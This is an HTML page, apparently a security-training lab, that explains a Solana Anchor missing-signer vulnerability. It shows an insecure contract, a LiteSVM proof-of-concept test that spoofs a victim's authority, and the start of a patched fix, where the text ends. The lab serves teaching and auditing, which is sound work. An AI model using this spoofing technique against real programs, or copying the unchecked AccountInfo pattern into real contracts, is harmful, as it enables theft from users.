@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Solana Exploit Lab // Challenge 0: Missing Signer Authorization</title>
+  
+  <!-- 
+    ==========================================================================
+    FONTS & STYLING DEPENDENCIES
+    - Inter: Clean, high-legibility UI typography for explanations and headings.
+    - JetBrains Mono: Crisp monospace font for Rust/Anchor code, pubkeys, and logs.
+    - Tailwind CSS (CDN): Utility-first CSS framework for zero-build-step responsive design.
+    ==========================================================================
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Custom Tailwind Theme Configuration -->
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            cyber: {
+              bg: '#09090b',       // Deep obsidian background
+              card: '#111114',     // Elevated card surface
+              border: '#27272a',   // Subtle zinc border
+              solana: '#14F195',   // Solana neon mint
+              purple: '#9945FF',   // Solana brand purple
+              danger: '#ef4444',   // Vulnerability highlight red
+              safe: '#10b981',     // Patched state emerald
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    /* Custom Scrollbar for Code & Terminal Windows */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #09090b;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #27272a;
+      border-radius: 3px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #3f3f46;
+    }
+
+    /* Subtle Ambient Grid Background */
+    .bg-grid {
+      background-size: 32px 32px;
+      background-image: 
+        linear-gradient(to right, rgba(255, 255, 255, 0.025) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.025) 1px, transparent 1px);
+    }
+
+    /* Glassmorphism Sticky Header */
+    .glass-nav {
+      background: rgba(9, 9, 11, 0.8);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+    }
+
+    /* Smooth Line Highlighting in Code Viewer */
+    .code-line {
+      transition: background-color 0.2s ease, border-color 0.2s ease;
+    }
+    .code-line:hover {
+      background-color: rgba(255, 255, 255, 0.03);
+    }
+    .code-line-active {
+      background-color: rgba(239, 68, 68, 0.14) !important;
+      border-left: 3px solid #ef4444;
+    }
+    .code-line-safe-active {
+      background-color: rgba(16, 185, 129, 0.14) !important;
+      border-left: 3px solid #10b981;
+    }
+  </style>
+</head>
+
+<body class="bg-cyber-bg bg-grid text-zinc-200 font-sans antialiased selection:bg-cyber-purple/30 selection:text-white min-h-screen flex flex-col">
+
+  <!-- ==========================================================================
+       1. TOP NAVIGATION BAR (STICKY)
+       - Displays Lab branding, Challenge switcher dropdown (ready for future labs),
+         and quick jump links.
+       ========================================================================== -->
+  <header class="sticky top-0 z-50 glass-nav border-b border-cyber-border">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
+      
+      <!-- Brand Identity -->
+      <div class="flex items-center gap-3">
+        <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-cyber-purple to-cyber-solana p-[1px]">
+          <div class="w-full h-full bg-cyber-bg rounded-[7px] flex items-center justify-center font-mono font-bold text-xs text-cyber-solana">
+            &gt;_
+          </div>
+        </div>
+        <div>
+          <span class="font-mono font-bold text-sm sm:text-base tracking-tight text-white">SOLANA<span class="text-cyber-solana">.EXPLOIT</span>.LAB</span>
+          <span class="hidden md:inline-block ml-2 text-xs font-mono text-zinc-500">// Audit &amp; PoC Field Manual</span>
+        </div>
+      </div>
+
+      <!-- Challenge Selector (Extensible for Challenge 1, 2, 3...) -->
+      <div class="flex items-center gap-3">
+        <label for="challenge-select" class="sr-only">Select Vulnerability Module</label>
+        <select id="challenge-select" onchange="loadChallenge(this.value)" class="bg-cyber-card border border-cyber-border text-xs sm:text-sm font-mono text-zinc-200 rounded-lg px-3 py-1.5 focus:outline-none focus:border-cyber-solana transition cursor-pointer">
+          <!-- Options are dynamically populated from CHALLENGE_DATABASE in JS -->
+        </select>
+      </div>
+    </div>
+  </header>
+
+  <!-- ==========================================================================
+       2. MAIN CONTENT CONTAINER
+       - Structured vertically into clear, scannable audit sections:
+         A. Hero Threat Brief & Metadata Badges
+         B. Interactive Vulnerability Anatomy (Click any line/step to inspect)
+         C. Live LiteSVM PoC Simulator (Toggle Insecure vs. Patched & Run TX)
+         D. Deep-Dive Breakdown Cards (Exploit Anatomy & Environment Notes)
+         E. Extensible Field Notes Drawer / Accordion (Add custom notes easily)
+       ========================================================================== -->
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12 space-y-12">
+
+    <!-- ------------------------------------------------------------------------
+         SECTION A: HERO THREAT BRIEF
+         - High-level summary, severity badge, CWE/Category mapping, and key metrics.
+         ------------------------------------------------------------------------ -->
+    <section class="space-y-6">
+      <div class="flex flex-wrap items-center gap-2.5 text-xs font-mono">
+        <span id="hero-badge-id" class="px-2.5 py-1 rounded-md bg-cyber-purple/15 text-cyber-purple border border-cyber-purple/30 font-semibold">
+          CHALLENGE 00
+        </span>
+        <span id="hero-badge-severity" class="px-2.5 py-1 rounded-md bg-red-500/15 text-red-400 border border-red-500/30 font-semibold">
+          SEVERITY: CRITICAL
+        </span>
+        <span id="hero-badge-stack" class="px-2.5 py-1 rounded-md bg-zinc-800/80 text-zinc-300 border border-zinc-700">
+          Anchor 0.30.1 • LiteSVM 0.9.1 • SBPF v0
+        </span>
+      </div>
+
+      <div class="max-w-4xl space-y-3">
+        <h1 id="hero-title" class="text-3xl sm:text-4xl lg:text-5xl font-bold tracking-tight text-white">
+          Missing Signer Authorization
+        </h1>
+        <p id="hero-subtitle" class="text-base sm:text-lg text-zinc-400 leading-relaxed">
+          When an Anchor instruction accepts a raw <code class="font-mono text-red-400 bg-red-500/10 px-1.5 py-0.5 rounded">AccountInfo&lt;'info&gt;</code> instead of <code class="font-mono text-emerald-400 bg-emerald-500/10 px-1.5 py-0.5 rounded">Signer&lt;'info&gt;</code>, the Solana runtime never verifies that the account's private key signed the transaction—allowing any attacker to impersonate any victim address.
+        </p>
+      </div>
+
+      <!-- Quick KPI / Telemetry Strip -->
+      <div class="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 pt-2">
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+          <div class="text-xs font-mono text-zinc-500 uppercase">Target Program ID</div>
+          <div class="mt-1 font-mono text-xs sm:text-sm text-zinc-200 truncate" title="Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS">Fg6PaFpo...PFsLnS</div>
+        </div>
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+          <div class="text-xs font-mono text-zinc-500 uppercase">Instruction Discriminator</div>
+          <div id="kpi-discriminator" class="mt-1 font-mono text-xs sm:text-sm text-cyber-solana">0x94 04 2c 22 ca 05 53 73</div>
+        </div>
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+          <div class="text-xs font-mono text-zinc-500 uppercase">Attack Vector</div>
+          <div class="mt-1 font-mono text-xs sm:text-sm text-red-400">is_signer = false</div>
+        </div>
+        <div class="bg-cyber-card border border-cyber-border rounded-xl p-4">
+          <div class="text-xs font-mono text-zinc-500 uppercase">Compute Cost (PoC)</div>
+          <div class="mt-1 font-mono text-xs sm:text-sm text-zinc-200">11,408 CU / 200,000 CU</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ------------------------------------------------------------------------
+         SECTION B: INTERACTIVE CODE & EXPLOIT ANATOMY
+         - Two-column desktop layout (stacked on mobile):
+           Left: Interactive Source Code Viewer (Switch between Contract & PoC Test)
+           Right: Granular Line-by-Line Inspector explaining WHY it's vulnerable
+         ------------------------------------------------------------------------ -->
+    <section class="space-y-4">
+      <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4">
+        <div>
+          <h2 class="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
+            <span class="w-2 h-2 rounded-full bg-cyber-solana"></span>
+            Interactive Code &amp; Vulnerability Inspector
+          </h2>
+          <p class="text-sm text-zinc-400 mt-1">
+            Tap or click any highlighted line in the code to inspect the exact mechanics behind the vulnerability and exploit.
+          </p>
+        </div>
+
+        <!-- File Tab Switcher -->
+        <div class="inline-flex rounded-lg bg-cyber-card p-1 border border-cyber-border self-start">
+          <button id="tab-contract" onclick="switchCodeTab('contract')" class="px-3 py-1.5 rounded-md text-xs font-mono font-medium bg-zinc-800 text-white shadow transition">
+            1. Vulnerable Contract (lib.rs)
+          </button>
+          <button id="tab-poc" onclick="switchCodeTab('poc')" class="px-3 py-1.5 rounded-md text-xs font-mono font-medium text-zinc-400 hover:text-white transition">
+            2. LiteSVM PoC (challenge_0.rs)
+          </button>
+          <button id="tab-patch" onclick="switchCodeTab('patch')" class="px-3 py-1.5 rounded-md text-xs font-mono font-medium text-zinc-400 hover:text-white transition">
+            3. Patched Fix
+          </button>
+        </div>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+        
+        <!-- LEFT PANEL (7 cols on desktop): Code Window -->
+        <div class="lg:col-span-7 bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-2xl">
+          <!-- Window Top Bar -->
+          <div class="px-4 py-2.5 bg-zinc-900/90 border-b border-cyber-border flex items-center justify-between">
+            <div class="flex items-center gap-2">
+              <span class="w-3 h-3 rounded-full bg-red-500/80"></span>
+              <span class="w-3 h-3 rounded-full bg-amber-500/80"></span>
+              <span class="w-3 h-3 rounded-full bg-emerald-500/80"></span>
+              <span id="code-filename" class="ml-2 text-xs font-mono text-zinc-400">programs/0-signer-authorization/insecure/src/lib.rs</span>
+            </div>
+            <button onclick="copyActiveCode()" id="copy-btn" class="text-xs font-mono text-zinc-400 hover:text-cyber-solana transition px-2 py-1 rounded hover:bg-zinc-800">
+              Copy Code
+            </button>
+          </div>
+
+          <!-- Rendered Code Lines Container -->
+          <div id="code-container" class="p-4 overflow-x-auto font-mono text-xs sm:text-sm leading-relaxed select-text">
+            <!-- Dynamically populated by renderCodeView() -->
+          </div>
+        </div>
+
+        <!-- RIGHT PANEL (5 cols on desktop): Contextual Explanation Inspector -->
+        <div class="lg:col-span-5 bg-cyber-card border border-cyber-border rounded-xl p-5 sm:p-6 space-y-5 lg:sticky lg:top-24">
+          <div class="flex items-center justify-between border-b border-cyber-border pb-3">
+            <span class="text-xs font-mono uppercase tracking-wider text-cyber-solana font-semibold">
+              Component Inspector
+            </span>
+            <span id="inspector-line-badge" class="text-xs font-mono px-2 py-0.5 rounded bg-red-500/15 text-red-400 border border-red-500/30">
+              Line 15 • Critical Flaw
+            </span>
+          </div>
+
+          <div class="space-y-3">
+            <h3 id="inspector-title" class="text-lg font-bold text-white">
+              Unchecked AccountInfo&lt;'info&gt;
+            </h3>
+            <p id="inspector-desc" class="text-sm text-zinc-300 leading-relaxed">
+              In Anchor, <code class="font-mono text-red-400">AccountInfo&lt;'info&gt;</code> is a raw wrapper around Solana's underlying account metadata. It performs <strong>zero</strong> ownership checks, <strong>zero</strong> data deserialization, and <strong>zero</strong> signature verification.
+            </p>
+          </div>
+
+          <!-- Why It's Vulnerable / Technical Impact Box -->
+          <div id="inspector-callout" class="p-4 rounded-lg bg-red-950/25 border border-red-500/30 space-y-2">
+            <div class="text-xs font-mono font-bold text-red-400 uppercase flex items-center gap-1.5">
+              <span>⚠</span> Why An Attacker Can Abuse This
+            </div>
+            <p id="inspector-impact" class="text-xs sm:text-sm text-zinc-300 leading-relaxed">
+              Because <code class="font-mono text-zinc-200">ctx.accounts.authority.is_signer</code> is never checked, an attacker simply constructs an <code class="font-mono text-zinc-200">AccountMeta::new_readonly(victim_pubkey, false)</code>. The Solana runtime sees <code class="font-mono text-zinc-200">is_signer = false</code>, doesn't require a cryptographic signature from the victim, and passes the account straight into <code class="font-mono text-zinc-200">log_message</code>.
+            </p>
+          </div>
+
+          <!-- Quick Jump Pills for Key Lines -->
+          <div class="pt-2 space-y-2">
+            <div class="text-xs font-mono text-zinc-500">Jump to key components in this file:</div>
+            <div id="inspector-pills" class="flex flex-wrap gap-2">
+              <!-- Populated dynamically -->
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ------------------------------------------------------------------------
+         SECTION C: INTERACTIVE LITESVM EXPLOIT SIMULATOR
+         - Allows the user to toggle between INSECURE (.so) and PATCHED (.so),
+           customize the Victim Pubkey, and simulate sending the transaction
+           to see real LiteSVM execution logs & account state changes.
+         ------------------------------------------------------------------------ -->
+    <section class="bg-cyber-card border border-cyber-border rounded-2xl p-5 sm:p-8 space-y-6">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-cyber-border pb-5">
+        <div>
+          <span class="text-xs font-mono text-cyber-purple uppercase tracking-wider font-semibold">Interactive Execution Lab</span>
+          <h2 class="text-xl sm:text-2xl font-bold text-white mt-1">Simulate the LiteSVM Transaction</h2>
+          <p class="text-sm text-zinc-400 mt-1">
+            Toggle the target binary state and execute the unsigned payload to observe how the Solana runtime responds.
+          </p>
+        </div>
+
+        <!-- Binary Target Toggle Switch -->
+        <div class="flex items-center gap-3 bg-cyber-bg p-1.5 rounded-xl border border-cyber-border self-start">
+          <button id="sim-mode-insecure" onclick="setSimMode('insecure')" class="px-3.5 py-2 rounded-lg text-xs font-mono font-semibold bg-red-500/20 text-red-400 border border-red-500/40 transition">
+            Target: Insecure (.so)
+          </button>
+          <button id="sim-mode-secure" onclick="setSimMode('secure')" class="px-3.5 py-2 rounded-lg text-xs font-mono font-semibold text-zinc-400 hover:text-white transition">
+            Target: Patched (.so)
+          </button>
+        </div>
+      </div>
+
+      <!-- Simulator Controls & Terminal Output -->
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+        
+        <!-- Transaction Payload Builder (5 cols) -->
+        <div class="lg:col-span-5 bg-cyber-bg border border-cyber-border rounded-xl p-5 flex flex-col justify-between space-y-5">
+          <div class="space-y-4">
+            <div class="text-xs font-mono text-zinc-400 uppercase tracking-wider border-b border-cyber-border pb-2">
+              Transaction Instruction Payload
+            </div>
+
+            <!-- Attacker Fee Payer -->
+            <div>
+              <label class="block text-xs font-mono text-zinc-400 mb-1">Fee Payer &amp; Sole Signer (Attacker)</label>
+              <div class="flex items-center justify-between bg-cyber-card border border-cyber-border rounded-lg px-3 py-2 text-xs font-mono">
+                <span class="text-zinc-300 truncate">Atk9x...7vKp (Signer: TRUE)</span>
+                <span class="px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 text-[10px]">SIGNED</span>
+              </div>
+            </div>
+
+            <!-- Victim Spoofed Account -->
+            <div>
+              <label for="sim-victim-input" class="block text-xs font-mono text-zinc-400 mb-1">
+                Spoofed Authority Account (Victim)
+              </label>
+              <div class="flex gap-2">
+                <input id="sim-victim-input" type="text" value="575R88gdpNaCsHsNEVHh9mwno8XNS4FjvowyypbGFjoG" class="w-full bg-cyber-card border border-cyber-border rounded-lg px-3 py-2 text-xs font-mono text-cyber-solana focus:outline-none focus:border-cyber-solana" />
+                <button onclick="randomizeVictim()" title="Generate new random Keypair" class="px-3 py-2 bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg text-xs font-mono transition shrink-0">
+                  New Key
+                </button>
+              </div>
+              <div class="mt-1.5 flex items-center justify-between text-[11px] font-mono">
+                <span class="text-zinc-500">AccountMeta Flag:</span>
+                <span class="text-red-400 font-semibold">is_signer = false</span>
+              </div>
+            </div>
+
+            <!-- Instruction Data -->
+            <div>
+              <span class="block text-xs font-mono text-zinc-400 mb-1">Instruction Data (8-Byte Discriminator)</span>
+              <div class="bg-cyber-card border border-cyber-border rounded-lg px-3 py-2 text-xs font-mono text-zinc-300">
+                [0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73]
+              </div>
+            </div>
+          </div>
+
+          <button onclick="runSimulation()" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-cyber-purple to-emerald-500 hover:opacity-95 text-black font-mono font-bold text-sm shadow-lg transition flex items-center justify-center gap-2 cursor-pointer">
+            <span>▶</span> Execute svm.send_transaction(tx)
+          </button>
+        </div>
+
+        <!-- LiteSVM Terminal Output (7 cols) -->
+        <div class="lg:col-span-7 bg-[#050507] border border-cyber-border rounded-xl p-5 font-mono text-xs sm:text-sm flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between border-b border-zinc-800 pb-2.5 mb-3">
+              <span class="text-zinc-400 text-xs">LiteSVM v0.9.1 // Runtime Execution Logs</span>
+              <span id="sim-status-badge" class="px-2 py-0.5 rounded text-[11px] bg-zinc-800 text-zinc-400">READY</span>
+            </div>
+            <pre id="sim-terminal-output" class="whitespace-pre-wrap break-all text-zinc-300 leading-relaxed min-h-[190px]">$ cargo test --test challenge_0_signer -- --nocapture
+Waiting for transaction execution... Click "Execute svm.send_transaction(tx)" to run the PoC.</pre>
+          </div>
+
+          <div id="sim-verdict-banner" class="mt-4 pt-3 border-t border-zinc-800/80 text-xs text-zinc-400">
+            Tip: Compare how the insecure binary logs the victim's pubkey without a signature, whereas the patched binary throws <code class="text-amber-400">ErrorCode::AccountNotSigner (0xbc2)</code>.
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ------------------------------------------------------------------------
+         SECTION D: STEP-BY-STEP ARCHITECTURE & ENVIRONMENT BREAKDOWN
+         - Cards explaining every part of the PoC + the exact Solana toolchain
+           lessons (SBPF v0, Modular v3 Crates, Discriminators).
+         ------------------------------------------------------------------------ -->
+    <section class="space-y-5">
+      <div>
+        <h2 class="text-xl sm:text-2xl font-bold text-white">PoC Architecture &amp; Toolchain Mechanics</h2>
+        <p class="text-sm text-zinc-400 mt-1">
+          Every moving part required to reproduce this exploit locally in <code class="font-mono text-zinc-300">solana-exploit-lab</code>.
+        </p>
+      </div>
+
+      <div id="architecture-cards" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+        <!-- Dynamically populated from CHALLENGE_DATABASE so adding new challenges updates these cards automatically -->
+      </div>
+    </section>
+
+    <!-- ------------------------------------------------------------------------
+         SECTION E: EXTENSIBLE AUDIT NOTES (ADD YOUR OWN NOTES IN BROWSER)
+         - Allows you to append personal findings, remediation checklists, or
+           extra technical details directly in the UI (saved to localStorage)
+           OR by editing the CHALLENGE_DATABASE object in the script below.
+         ------------------------------------------------------------------------ -->
+    <section class="bg-cyber-card border border-cyber-border rounded-2xl p-5 sm:p-6 space-y-4">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+        <div>
+          <h2 class="text-lg font-bold text-white">Personal Audit Field Notes</h2>
+          <p class="text-xs sm:text-sm text-zinc-400">
+            Append extra observations, bug bounty checklist items, or links for this challenge. Saved automatically in your browser.
+          </p>
+        </div>
+        <button onclick="clearCustomNotes()" class="text-xs font-mono text-zinc-500 hover:text-red-400 transition self-start sm:self-auto">
+          Reset Notes
+        </button>
+      </div>
+
+      <!-- Existing Notes List -->
+      <div id="custom-notes-list" class="space-y-2.5"></div>
+
+      <!-- Add Note Form -->
+      <form onsubmit="addCustomNote(event)" class="flex flex-col sm:flex-row gap-2.5 pt-2">
+        <input id="custom-note-input" type="text" placeholder="e.g., Check if authority is used as a PDA seed or transfers lamports in similar Anchor programs..." class="flex-1 bg-cyber-bg border border-cyber-border rounded-lg px-3.5 py-2.5 text-sm text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-cyber-solana" required />
+        <button type="submit" class="px-4 py-2.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-white font-mono text-xs font-semibold transition shrink-0 cursor-pointer">
+          + Add Note
+        </button>
+      </form>
+    </section>
+
+  </main>
+
+  <!-- ==========================================================================
+       FOOTER
+       ========================================================================== -->
+  <footer class="border-t border-cyber-border py-6 mt-12">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs font-mono text-zinc-500">
+      <div>Solana Exploit Lab // Built for Smart-Contract Security Research</div>
+      <div>Extendable Single-File Architecture • Edit <code class="text-zinc-300">CHALLENGE_DATABASE</code> in source to add Challenge 1+</div>
+    </div>
+  </footer>
+
+  <!-- ==========================================================================
+       JAVASCRIPT APPLICATION LOGIC & EXTENSIBLE DATA STORE
+       ========================================================================== -->
+  <script>
+    /**
+     * =========================================================================
+     * 1. EXTENSIBLE CHALLENGE DATABASE
+     * =========================================================================
+     * HOW TO ADD MORE DETAIL OR NEW CHALLENGES LATER:
+     * Simply duplicate the 'challenge_0' object inside `CHALLENGE_DATABASE`
+     * (e.g., add `'challenge_1': { ... }`), update the code lines, explanations,
+     * and simulator logs, and the entire UI (dropdown, code inspector, cards,
+     * and simulator) will automatically render your new challenge!
+     */
+    const CHALLENGE_DATABASE = {
+      challenge_0: {
+        id: "CHALLENGE 00",
+        dropdownLabel: "00 // Missing Signer Authorization",
+        title: "Missing Signer Authorization",
+        severity: "SEVERITY: CRITICAL",
+        stack: "Anchor 0.30.1 • LiteSVM 0.9.1 • SBPF v0",
+        subtitle: "When an Anchor instruction accepts a raw AccountInfo<'info> instead of Signer<'info>, the Solana runtime never verifies that the account's private key signed the transaction—allowing any attacker to impersonate any victim address.",
+        programId: "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+        discriminator: "0x94 04 2c 22 ca 05 53 73",
+        attackVector: "is_signer = false",
+        computeUnits: "11,408 CU / 200,000 CU",
+
+        // Code files & line-by-line interactive annotations
+        files: {
+          contract: {
+            filename: "programs/0-signer-authorization/insecure/src/lib.rs",
+            defaultLine: 15,
+            lines: [
+              { num: 1,  code: `use anchor_lang::prelude::*;`, type: "normal" },
+              { num: 2,  code: ``, type: "normal" },
+              { num: 3,  code: `declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");`, type: "normal" },
+              { num: 4,  code: ``, type: "normal" },
+              { num: 5,  code: `#[program]`, type: "normal" },
+              { num: 6,  code: `pub mod signer_authorization_insecure {`, type: "normal" },
+              { num: 7,  code: `    use super::*;`, type: "normal" },
+              { num: 8,  code: ``, type: "normal" },
+              { num: 9,  code: `    pub fn log_message(ctx: Context<LogMessage>) -> Result<()> {`, type: "info", pill: "Instruction Entry",
+                title: "Instruction Entrypoint: log_message",
+                badge: "Line 9 • Instruction Handler",
+                desc: "Anchor generates an 8-byte discriminator from sha256(\"global:log_message\") -> [0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73]. Any transaction starting with those 8 bytes invokes this function.",
+                impact: "Before this function body runs, Anchor validates the LogMessage<'info> struct. Because LogMessage has no signer constraint, execution enters log_message unconditionally."
+              },
+              { num: 10, code: `        msg!("GM {}", ctx.accounts.authority.key().to_string());`, type: "vuln", pill: "Privileged Action",
+                title: "Trusted Execution on Unverified Key",
+                badge: "Line 10 • Spoofed Authority",
+                desc: "The program trusts ctx.accounts.authority.key() as the authenticated caller and logs a greeting on their behalf. In a real DeFi protocol, this would be a token transfer, vault withdrawal, or admin config update.",
+                impact: "Because authority never signed the transaction, the attacker logs \"Program log: GM <VICTIM_PUBKEY>\" while paying fees solely from the attacker's wallet."
+              },
+              { num: 11, code: `        Ok(())`, type: "normal" },
+              { num: 12, code: `    }`, type: "normal" },
+              { num: 13, code: `}`, type: "normal" },
+              { num: 14, code: ``, type: "normal" },
+              { num: 15, code: `#[derive(Accounts)]`, type: "normal" },
+              { num: 16, code: `pub struct LogMessage<'info> {`, type: "normal" },
+              { num: 17, code: `    authority: AccountInfo<'info>, // <-- VULNERABILITY: No signer check!`, type: "vuln", pill: "Root Cause (Line 17)",
+                title: "Unchecked AccountInfo<'info>",
+                badge: "Line 17 • Critical Flaw",
+                desc: "In Anchor, AccountInfo<'info> is a raw wrapper around Solana's underlying account metadata. It performs zero ownership checks, zero data deserialization, and zero signature verification.",
+                impact: "An attacker passes AccountMeta::new_readonly(victim.pubkey(), false). The Solana runtime sees is_signer = false, does NOT require the victim's private key signature, and passes the account directly into log_message."
+              },
+              { num: 18, code: `}`, type: "normal" }
+            ]
+          },
+
+          poc: {
+            filename: "tests/challenge_0_signer.rs",
+            defaultLine: 27,
+            lines: [
+              { num: 1,  code: `use litesvm::LiteSVM;`, type: "normal" },
+              { num: 2,  code: `use solana_account::Account;`, type: "normal" },
+              { num: 3,  code: `use solana_address::Address;`, type: "normal" },
+              { num: 4,  code: `use solana_instruction::{AccountMeta, Instruction};`, type: "normal" },
+              { num: 5,  code: `use solana_keypair::Keypair;`, type: "normal" },
+              { num: 6,  code: `use solana_signer::Signer;`, type: "normal" },
+              { num: 7,  code: `use solana_transaction::Transaction;`, type: "normal" },
+              { num: 8,  code: `use std::str::FromStr;`, type: "normal" },
+              { num: 9,  code: ``, type: "normal" },
+              { num: 10, code: `#[test]`, type: "normal" },
+              { num: 11, code: `fn test_missing_signer_exploit() {`, type: "normal" },
+              { num: 12, code: `    let mut svm = LiteSVM::new();`, type: "normal" },
+              { num: 13, code: ``, type: "normal" },
+              { num: 14, code: `    // Load .so compiled with: cargo build-sbf --arch v0`, type: "info", pill: "SBPF v0 Binary",
+                title: "Loading SBPF v0 Compiled Binary",
+                badge: "Line 14 • Toolchain Alignment",
+                desc: "Agave CLI 4.3.2 compiles to newer SBPF v3 ELF headers by default, whereas LiteSVM 0.9.1 embeds Agave 3.1.14. Building with --arch v0 emits baseline SBPF v0 bytecode that loads cleanly.",
+                impact: "Injecting the .so bytes into program_id with owner BPFLoader2111111111111111111111111111111111 and executable: true makes the vulnerable contract callable in-memory."
+              },
+              { num: 15, code: `    let program_bytes = std::fs::read("../sealevel-attacks/.../signer_authorization_insecure.so").unwrap();`, type: "normal" },
+              { num: 16, code: `    let program_id = Address::from_str("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS").unwrap();`, type: "normal" },
+              { num: 17, code: `    let bpf_loader_v2 = Address::from_str("BPFLoader2111111111111111111111111111111111").unwrap();`, type: "normal" },
+              { num: 18, code: `    svm.set_account(program_id, Account { lamports: 1_000_000_000, data: program_bytes, owner: bpf_loader_v2, executable: true, rent_epoch: 0 }).unwrap();`, type: "normal" },
+              { num: 19, code: ``, type: "normal" },
+              { num: 20, code: `    let attacker = Keypair::new();`, type: "normal" },
+              { num: 21, code: `    let victim = Keypair::new(); // Attacker does NOT have victim's private key`, type: "normal" },
+              { num: 22, code: `    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();`, type: "normal" },
+              { num: 23, code: ``, type: "normal" },
+              { num: 24, code: `    // EXPLOIT PAYLOAD: Pass victim pubkey with is_signer = false`, type: "vuln", pill: "Exploit AccountMeta",
+                title: "Forged AccountMeta (is_signer = false)",
+                badge: "Line 24 • Exploit Vector",
+                desc: "AccountMeta::new_readonly(victim.pubkey(), false) tells the Solana runtime to include the victim's public key in the instruction's account array without requiring a cryptographic signature.",
+                impact: "If the contract had properly used Signer<'info>, the runtime/Anchor would immediately abort here with ErrorCode::AccountNotSigner."
+              },
+              { num: 25, code: `    let accounts = vec![AccountMeta::new_readonly(victim.pubkey(), false)];`, type: "vuln" },
+              { num: 26, code: `    let discriminator = vec![0x94, 0x04, 0x2c, 0x22, 0xca, 0x05, 0x53, 0x73];`, type: "info", pill: "Anchor Discriminator",
+                title: "8-Byte Anchor Instruction Discriminator",
+                badge: "Line 26 • Instruction Routing",
+                desc: "Computed via printf \"global:log_message\" | sha256sum | head -c 16. Anchor hashes the namespace + snake_case function name to route incoming instruction bytes.",
+                impact: "Without these exact 8 bytes, Anchor rejects the transaction with custom error 0x65 (InstructionFallbackNotFound)."
+              },
+              { num: 27, code: `    let instruction = Instruction { program_id, accounts, data: discriminator };`, type: "normal" },
+              { num: 28, code: ``, type: "normal" },
+              { num: 29, code: `    // Sign transaction ONLY with attacker's Keypair`, type: "vuln", pill: "Single-Signer TX",
+                title: "Transaction Signed Only by Attacker",
+                badge: "Line 30 • Unauthorized Execution",
+                desc: "Transaction::new_signed_with_payer signs solely with &[&attacker]. The victim never interacts with or approves this transaction.",
+                impact: "LiteSVM executes the transaction and emits \"Program log: GM <victim.pubkey()>\"—proving complete authority spoofing."
+              },
+              { num: 30, code: `    let tx = Transaction::new_signed_with_payer(&[instruction], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());`, type: "vuln" },
+              { num: 31, code: `    let result = svm.send_transaction(tx).unwrap();`, type: "normal" },
+              { num: 32, code: `}`, type: "normal" }
+            ]
+          },
+
+          patch: {
+            filename: "programs/0-signer-authorization/secure/src/lib.rs",
+            defaultLine: 11,
+            lines: [
+              { num: 1,  code: `use anchor_lang::prelude::*;`, type: "normal" },
+              { num: 2,  code: ``, type: "normal" },
+              { num: 3,  code: `declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");`, type: "normal" },
+              { num: 4,  code: ``, type: "normal" },
+              { num: 5,  code: `#[program]`, type: "normal" },
+              { num: 6,  code: `pub mod signer_authorization_secure {`, type: "normal" },
+              { num: 7,  code: `    use super::*;`, type: "normal" },
+              { num: 8,  code: ``, type: "normal" },
